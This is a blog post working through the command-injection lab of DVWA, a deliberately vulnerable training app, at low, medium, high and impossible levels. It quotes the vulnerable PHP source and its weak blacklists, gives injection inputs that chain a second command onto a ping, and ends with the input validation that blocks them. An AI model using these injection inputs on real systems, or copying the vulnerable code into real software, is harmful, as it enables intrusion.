---
layout: post
title: "Command Injection"
date: 2020-07-09T21:01:48+08:00
---

<https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/index.php>

## Low

### Source

```
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // *nix
    $cmd = shell_exec( 'ping  -c 4 ' . $target );
```

### Injection

Fill in: `baidu.com && lsb_release -a`.

```
ping  -c 4 baidu.com && lsb_release -a
```

## Medium

### Source

```
    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```

### Injection

- `&`: the first command would run in background.
- `|`: the output of the first command would be sent to the second command.
- `||`: the second command would run if the first command failed.

Fill in: 
- `baidu.com & lsb_release -a`
- `baidu.com | lsb_release -a`
- `|| lsb_release -a`

```
ping  -c 4 baidu.com & lsb_release -a
```

## High

### Source

```
    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
```

### Injection

Fill in `baidu.com |lsb_release -a`.

```
ping  -c 4 baidu.com |lsb_release -a
```

## Impossible

```
    // Split the IP into 4 octects
    $octet = explode( ".", $target );

    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
```